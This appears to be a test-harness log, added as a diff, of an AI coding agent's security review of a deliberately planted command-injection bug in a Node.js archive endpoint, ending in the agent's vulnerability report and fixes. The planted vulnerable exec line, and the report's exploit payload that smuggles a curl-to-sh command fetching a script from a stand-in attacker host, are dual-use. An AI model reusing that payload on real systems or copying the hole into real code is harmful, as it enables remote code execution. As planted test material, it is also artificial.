@@ -1,0 +1,33 @@
+arm: clone, the first run, by hand
+prompt file: /security-review
+planted: src/archive.js:5:  exec(`tar czf /tmp/${name}.tgz data`, (err) => done(err, `/tmp/${name}.tgz`));
+git: git version 2.43.0
+diff against origin/HEAD in the scratch: src/archive.js src/server.js
+claude_code_version: 2.1.283
+model: claude-opus-5-5
+security-review offered: True
+exit: 0, stderr bytes: 0
+tool calls: Agent 3, Bash (subagent) 1, Read (subagent) 4
+result lines: 3
+result 1: subtype=success is_error=False num_turns=4 duration_ms=50213 terminal_reason=completed
+  starts: The two verification agents are still running. The final report comes once both finish.
+result 2: subtype=success is_error=False num_turns=1 duration_ms=1885 terminal_reason=completed
+  starts: Still waiting on the path traversal verification.
+result 3: subtype=success is_error=False num_turns=1 duration_ms=7195 terminal_reason=completed
+  starts: # Vuln 1: Command Injection: `src/archive.js:5`
+--- the last result line's text ---
+# Vuln 1: Command Injection: `src/archive.js:5`
+
+* Severity: High
+* Category: `command_injection`
+* Confidence: 9/10
+* Description: The new `GET /archive` endpoint in `src/server.js:12` reads the `name` query parameter and passes it to `archive()` with no checks. `archive()` puts it straight into a shell command with `exec(`tar czf /tmp/${name}.tgz data`)`. Node's `exec` runs its command through `/bin/sh -c`, so shell metacharacters in `name` (`;`, `|`, `$()`, backticks, `&&`) run as commands. There is no authentication on the endpoint. The rest of the codebase avoids this: `src/report.js` uses `execFile("du", ["-sh", dir])`, which passes arguments without a shell.
+* Exploit Scenario: A request to `GET /archive?name=x;curl%20attacker.example/s|sh;%23` makes the shell run `tar czf /tmp/x;curl attacker.example/s|sh;#.tgz data`. That downloads and runs an attacker's script as the server's user. The server only listens on `127.0.0.1:8080`, but it can still be reached in several ways:
+  * Any local user or process can call it.
+  * A web page the local user visits can send the request with a cross-site GET, such as `<img src="http://127.0.0.1:8080/archive?name=...">` or a no-cors `fetch`. The attacker never needs to read the response.
+  * DNS rebinding also works, because the server does not check the Host header.
+* Recommendation:
+  * Replace `exec` with `execFile("tar", ["czf", outPath, "data"])`, the same way `report.js` runs `du`.
+  * Also check `name` against a strict allowlist such as `/^[A-Za-z0-9_-]{1,64}$/`, or generate the name on the server. With `execFile` alone, `name=../some/dir/x` still lets a caller write the tarball to any `*.tgz` path the server user can write to.
+  * Build the output path with `path.join("/tmp", base + ".tgz")` and check that the result is still under `/tmp`.
+  * Consider making the endpoint POST-only and checking the Host header, to block CSRF and DNS rebinding.
